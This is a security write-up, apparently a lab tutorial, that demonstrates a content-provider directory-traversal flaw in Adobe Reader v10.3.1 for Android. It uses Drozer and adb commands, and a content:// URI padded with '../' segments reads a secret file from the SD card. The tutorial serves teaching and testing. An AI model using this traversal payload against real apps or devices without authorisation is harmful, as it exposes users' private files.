# Content Provider File Traversal Vulnerability For Android
## DESCRIPTION

The Content Provider class provides a mechanism for managing and sharing data with other applications. When sharing a providerâ€™s data with other apps, access control should be carefully implemented to prohibit unauthorized access to sensitive data.

Successful exploitation could lead to information disclosure.

## PREREQUISITES

1. Adobe reader v10.3.1 for android

2. adb(Android debug bridge)

3. Drozer app for android

## EXPLOITATION

The following test has been done on Adobe Reader v10.3.1.

Install Adobe Reader in Genymotion/Android device

$ adb install <AdobeReader.apk>

![](https://github.com/v1ns3c/Write-ups/blob/25cafe56ff5b60d74b9b1877cfd35e80cbd9ced8/Images/Documentations/Content_Provider_File_Traversal_Vulnerability_For_Android/1.jpg)

Install and open the Drozer app

Turn ON the Embedded Server to establish connection.

![](https://github.com/v1ns3c/Write-ups/blob/25cafe56ff5b60d74b9b1877cfd35e80cbd9ced8/Images/Documentations/Content_Provider_File_Traversal_Vulnerability_For_Android/2.png)
Establish a connection with Drozer app

$ adb connect <ip address of emulator or device>

$ adb forward tcp:31415 tcp:31415

$ drozer console connect

![](https://github.com/v1ns3c/Write-ups/blob/25cafe56ff5b60d74b9b1877cfd35e80cbd9ced8/Images/Documentations/Content_Provider_File_Traversal_Vulnerability_For_Android/3.png)

dz> run app.package.list
![](https://github.com/v1ns3c/Write-ups/blob/25cafe56ff5b60d74b9b1877cfd35e80cbd9ced8/Images/Documentations/Content_Provider_File_Traversal_Vulnerability_For_Android/4.png)

To see what components of the app are exported

dz> run app.package.attacksurface com.adobe.reader
![](https://github.com/v1ns3c/Write-ups/blob/25cafe56ff5b60d74b9b1877cfd35e80cbd9ced8/Images/Documentations/Content_Provider_File_Traversal_Vulnerability_For_Android/5.png)

dz> run app.provider.finduri com.adobe.reader
![](https://github.com/v1ns3c/Write-ups/blob/25cafe56ff5b60d74b9b1877cfd35e80cbd9ced8/Images/Documentations/Content_Provider_File_Traversal_Vulnerability_For_Android/6.png)

Try running the read command as shown below

dz> run app.provider.read content://com.adobe.reader.fileprovider/

![](https://github.com/v1ns3c/Write-ups/blob/25cafe56ff5b60d74b9b1877cfd35e80cbd9ced8/Images/Documentations/Content_Provider_File_Traversal_Vulnerability_For_Android/7.png)
The command above fails to read the content.

Start adding some backtrack directory traversals(../) till the root is reached.

dz> run app.provider.read content://com.adobe.reader.fileprovider/../mnt/sdcard/secret.txt
![](https://github.com/v1ns3c/Write-ups/blob/25cafe56ff5b60d74b9b1877cfd35e80cbd9ced8/Images/Documentations/Content_Provider_File_Traversal_Vulnerability_For_Android/8.png)

However, adding some more backtrack directory traversals (../) as shown below, the root is reached and the reading process is successful.

dz> run app.provider.read content://com.adobe.reader.fileprovider/../../../../mnt/sdcard/secret.txt
![](https://github.com/v1ns3c/Write-ups/blob/25cafe56ff5b60d74b9b1877cfd35e80cbd9ced8/Images/Documentations/Content_Provider_File_Traversal_Vulnerability_For_Android/9.png)

The secret is found which was stored in the SD card.

Observing the permissions provided to Adobe Reader and Drozer as shown below

dz> run app.package.info -f adobe
![](https://github.com/v1ns3c/Write-ups/blob/25cafe56ff5b60d74b9b1877cfd35e80cbd9ced8/Images/Documentations/Content_Provider_File_Traversal_Vulnerability_For_Android/10.png)

dz> run app.package.info -f drozer
![](https://github.com/v1ns3c/Write-ups/blob/25cafe56ff5b60d74b9b1877cfd35e80cbd9ced8/Images/Documentations/Content_Provider_File_Traversal_Vulnerability_For_Android/11.png)

So, it is important to notice that the attack has been successful due to the vulnerability of the Adobe Reader application, having the permission READ_EXTERNAL_STORAGE, as seen above. In other words, the Adobe Reader can read files from the SD card, but Drozer cannot.

### Thanks for reading!





